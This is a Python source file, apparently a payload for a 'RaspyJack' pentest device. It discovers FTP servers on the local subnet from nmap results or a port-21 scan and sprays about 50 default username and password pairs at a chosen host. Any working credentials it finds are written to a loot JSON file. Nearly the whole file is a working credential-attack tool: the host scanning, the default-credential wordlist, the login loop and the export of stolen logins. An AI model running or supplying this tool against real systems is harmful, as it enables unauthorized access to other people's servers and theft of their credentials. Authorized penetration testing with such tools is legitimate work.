#!/usr/bin/env python3
# @name: FTP Credential Brute-Force
# @desc: Discover local FTP services from existing scan loot or a quick port check, test the built-in default credential list, and save successful authorized logins.
# @category: credentials
# @danger: true
# @active: true
# @web: true
"""
RaspyJack Payload -- FTP Credential Brute-Force
================================================
Author: 7h30th3r0n3

Auto-discovers FTP hosts from nmap loot or quick port-21 scan on the
local subnet, then sprays ~50 common user:pass pairs against each host
using ftplib (stdlib).

Setup / Prerequisites:
  - Built-in wordlist of ~50 common user:pass pairs (no external files needed).
  - Optional: nmap scan results in $CITYPOP_ROOT/loot/Nmap/ for
    automatic host discovery.

Controls:
  python3 ftp_bruteforce.py [target_host]

  target_host  -- optional. If omitted, hosts are discovered from nmap
                  loot and a quick port-21 scan of the local subnet; the
                  operator is then prompted to pick one from the list.
                  If given, brute-forcing starts immediately against that
                  host (no discovery scan is run).

  Results are printed as they are found and exported to loot when the
  run finishes (or is interrupted with Ctrl-C).

Loot: $CITYPOP_ROOT/loot/FTP/ftp_creds_YYYYMMDD_HHMMSS.json
"""

from payloads._web_input import request_input
import os
import sys
import json
import time
import ftplib
import socket
import threading
import subprocess
import ipaddress
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

LOOT_DIR = os.path.join(os.environ.get("CITYPOP_ROOT", os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))), 'loot', 'FTP')
NMAP_LOOT = os.path.join(os.environ.get("CITYPOP_ROOT", os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))), 'loot')
RATE_LIMIT = 0.5

# ---------------------------------------------------------------------------
# Built-in wordlist (~50 common FTP user:pass pairs)
# ---------------------------------------------------------------------------
WORDLIST = [
    ("admin", "admin"), ("admin", "password"), ("admin", "1234"),
    ("admin", "12345"), ("admin", "123456"), ("admin", ""),
    ("root", "root"), ("root", "password"), ("root", "toor"),
    ("root", "1234"), ("root", "12345"), ("root", ""),
    ("anonymous", "anonymous"), ("anonymous", ""), ("anonymous", "guest"),
    ("ftp", "ftp"), ("ftp", ""), ("ftp", "password"),
    ("user", "password"), ("user", "user"), ("user", "1234"),
    ("test", "test"), ("test", "password"), ("test", "1234"),
    ("guest", "guest"), ("guest", ""), ("guest", "password"),
    ("ftpuser", "ftpuser"), ("ftpuser", "password"), ("ftpuser", "1234"),
    ("upload", "upload"), ("www", "www"), ("backup", "backup"),
    ("oracle", "oracle"), ("postgres", "postgres"), ("mysql", "mysql"),
    ("nagios", "nagios"), ("tomcat", "tomcat"), ("pi", "raspberry"),
    ("ubnt", "ubnt"), ("support", "support"), ("monitor", "monitor"),
    ("service", "service"), ("operator", "operator"), ("admin", "admin123"),
    ("admin", "changeme"), ("root", "changeme"), ("admin", "default"),
    ("cisco", "cisco"), ("admin", "letmein"),
]

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
running = True

found_creds = []    # [{"host": ..., "user": ..., "pass": ...}]
attempts_done = 0
attempts_total = 0


# ---------------------------------------------------------------------------
# Network helpers
# ---------------------------------------------------------------------------

def _detect_subnet():
    """Return the local subnet CIDR (e.g. 192.168.1.0/24)."""
    for iface in ("eth0", "wlan0"):
        try:
            res = subprocess.run(
                ["ip", "-4", "addr", "show", iface],
                capture_output=True, text=True, timeout=5,
            )
            for line in res.stdout.splitlines():
                stripped = line.strip()
                if stripped.startswith("inet "):
                    return stripped.split()[1]
        except Exception:
            pass
    return None


def _load_nmap_ftp_hosts():
    """Try to find FTP hosts from existing nmap loot JSON files."""
    ftp_hosts = set()
    if not os.path.isdir(NMAP_LOOT):
        return ftp_hosts
    for dirpath, _dirs, files in os.walk(NMAP_LOOT):
        for fname in files:
            if not fname.endswith(".json"):
                continue
            fpath = os.path.join(dirpath, fname)
            try:
                with open(fpath, "r") as fh:
                    data = json.load(fh)
                _extract_ftp_from_nmap(data, ftp_hosts)
            except Exception:
                pass
    return ftp_hosts


def _extract_ftp_from_nmap(data, ftp_hosts):
    """Recursively search nmap JSON for port 21 open entries."""
    if isinstance(data, dict):
        port = data.get("port", data.get("portid"))
        state = data.get("state", "")
        if str(port) == "21" and "open" in str(state).lower():
            ip = data.get("ip", data.get("addr", data.get("host", "")))
            if ip:
                ftp_hosts.add(str(ip))
        for val in data.values():
            _extract_ftp_from_nmap(val, ftp_hosts)
    elif isinstance(data, list):
        for item in data:
            _extract_ftp_from_nmap(item, ftp_hosts)


def _scan_ftp_hosts(cidr):
    """Quick TCP connect scan for port 21 on a /24 subnet."""
    found = []
    try:
        network = ipaddress.IPv4Network(cidr, strict=False)
    except ValueError:
        return found
    for host in network.hosts():
        if not running:
            break
        ip = str(host)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((ip, 21))
            sock.close()
            if result == 0:
                found.append(ip)
        except Exception:
            pass
    return found


def _discover_hosts():
    """Discover FTP hosts from nmap loot and a quick subnet scan."""
    new_hosts = set()

    nmap_hosts = _load_nmap_ftp_hosts()
    new_hosts.update(nmap_hosts)
    if nmap_hosts:
        print(f"[*] Found {len(nmap_hosts)} FTP host(s) in nmap loot", flush=True)

    cidr = _detect_subnet()
    if cidr and running:
        print(f"[*] Scanning subnet {cidr} for port 21...", flush=True)
        scanned = _scan_ftp_hosts(cidr)
        new_hosts.update(scanned)

    return sorted(new_hosts)


# ---------------------------------------------------------------------------
# Brute-force
# ---------------------------------------------------------------------------

def _try_ftp_login(host, user, password):
    """Attempt a single FTP login. Returns True on success."""
    try:
        ftp = ftplib.FTP(timeout=5)
        ftp.connect(host, 21, timeout=5)
        ftp.login(user, password)
        ftp.quit()
        return True
    except Exception:
        return False


def _brute_force(target_host):
    """Brute-force a single host with the built-in wordlist."""
    global attempts_done, attempts_total

    with lock:
        attempts_done = 0
        attempts_total = len(WORDLIST)

    print(f"[*] Starting brute-force against {target_host} "
          f"({attempts_total} credential pairs)", flush=True)
    start_time = time.time()

    for idx, (user, passwd) in enumerate(WORDLIST):
        if not running:
            break

        with lock:
            attempts_done = idx + 1

        success = _try_ftp_login(target_host, user, passwd)

        if success:
            entry = {"host": target_host, "user": user, "pass": passwd}
            with lock:
                found_creds.append(entry)
            print(f"[+] FOUND: {user}:{passwd} @ {target_host}", flush=True)
        elif (idx + 1) % 10 == 0:
            elapsed = time.time() - start_time
            rate = (idx + 1) / max(elapsed, 0.01)
            print(f"[*] {idx + 1}/{attempts_total} attempts "
                  f"({rate:.1f}/s)", flush=True)

        time.sleep(RATE_LIMIT)

    if not any(c["host"] == target_host for c in found_creds):
        print(f"[*] No valid credentials found for {target_host}", flush=True)


# ---------------------------------------------------------------------------
# Export
# ---------------------------------------------------------------------------

def _export_loot():
    """Write found credentials to JSON loot file."""
    os.makedirs(LOOT_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    filepath = os.path.join(LOOT_DIR, f"ftp_creds_{ts}.json")
    with lock:
        data = {
            "timestamp": ts,
            "credentials": list(found_creds),
        }
    with open(filepath, "w") as fh:
        json.dump(data, fh, indent=2)
    return filepath


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global running

    if "-h" in sys.argv or "--help" in sys.argv:
        print("Usage: python3 ftp_bruteforce.py [target_host]", flush=True)
        sys.exit(0)

    target = sys.argv[1] if len(sys.argv) > 1 else None

    try:
        if not target:
            hosts = _discover_hosts()
            if not hosts:
                print("[!] No FTP hosts discovered. Pass a target host as an "
                      "argument instead.", flush=True)
                sys.exit(1)

            print(f"[*] Discovered {len(hosts)} FTP host(s):", flush=True)
            for i, h in enumerate(hosts, 1):
                print(f"  {i}. {h}", flush=True)

            choice = request_input(f"Select a host [1-{len(hosts)}]: ").strip()
            try:
                idx = int(choice) - 1
                if idx < 0 or idx >= len(hosts):
                    raise ValueError
            except ValueError:
                print("[!] Invalid selection.", flush=True)
                sys.exit(1)
            target = hosts[idx]

        _brute_force(target)

    except KeyboardInterrupt:
        running = False
        print("\n[*] Interrupted.", flush=True)

    finally:
        running = False
        with lock:
            has_creds = len(found_creds) > 0
        if has_creds:
            path = _export_loot()
            print(f"[*] Exported {len(found_creds)} credential(s) to {path}", flush=True)
        else:
            print("[*] No credentials to export.", flush=True)

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
